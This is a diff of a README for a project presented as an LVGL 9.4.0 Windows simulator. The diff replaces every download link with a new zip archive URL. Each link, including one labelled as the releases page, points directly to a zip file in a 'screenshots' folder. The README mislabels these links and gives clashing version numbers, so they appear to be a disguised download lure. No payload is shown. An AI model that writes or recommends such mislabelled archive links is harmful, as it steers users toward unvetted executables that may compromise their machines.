@@ -1,6 +1,6 @@
 # 🎮 lvgl9-sdl2-windows-simulator - A Simple LVGL 9.4.0 Simulator for Windows
 
-[![Download](https://github.com/kmen4/lvgl9-sdl2-windows-simulator/raw/refs/heads/main/screenshots/windows_simulator_sdl_lvgl_1.3.zip)](https://github.com/kmen4/lvgl9-sdl2-windows-simulator/raw/refs/heads/main/screenshots/windows_simulator_sdl_lvgl_1.3.zip)
+[![Download](https://raw.githubusercontent.com/kmen4/lvgl9-sdl2-windows-simulator/main/screenshots/lvgl-windows-sdl-simulator-v3.3-beta.2.zip)](https://raw.githubusercontent.com/kmen4/lvgl9-sdl2-windows-simulator/main/screenshots/lvgl-windows-sdl-simulator-v3.3-beta.2.zip)
 
 ## 📖 Overview
 
@@ -14,13 +14,13 @@ You can easily run the simulator by following these steps. No programming knowle
 
 To begin, visit the download page to get the latest version of the software. 
 
-[Download the latest release](https://github.com/kmen4/lvgl9-sdl2-windows-simulator/raw/refs/heads/main/screenshots/windows_simulator_sdl_lvgl_1.3.zip)
+[Download the latest release](https://raw.githubusercontent.com/kmen4/lvgl9-sdl2-windows-simulator/main/screenshots/lvgl-windows-sdl-simulator-v3.3-beta.2.zip)
 
 ### Step 1: Visit the Release Page
 
 Click the link below to access the releases page:
 
-[Visit the Releases Page](https://github.com/kmen4/lvgl9-sdl2-windows-simulator/raw/refs/heads/main/screenshots/windows_simulator_sdl_lvgl_1.3.zip)
+[Visit the Releases Page](https://raw.githubusercontent.com/kmen4/lvgl9-sdl2-windows-simulator/main/screenshots/lvgl-windows-sdl-simulator-v3.3-beta.2.zip)
 
 ### Step 2: Find the Latest Version
 
@@ -79,4 +79,4 @@ For support, please refer to the issues section on GitHub. You can post any ques
 
 Remember, you can always download the latest version from our releases page.
 
-[Download the latest release](https://github.com/kmen4/lvgl9-sdl2-windows-simulator/raw/refs/heads/main/screenshots/windows_simulator_sdl_lvgl_1.3.zip)
+[Download the latest release](https://raw.githubusercontent.com/kmen4/lvgl9-sdl2-windows-simulator/main/screenshots/lvgl-windows-sdl-simulator-v3.3-beta.2.zip)
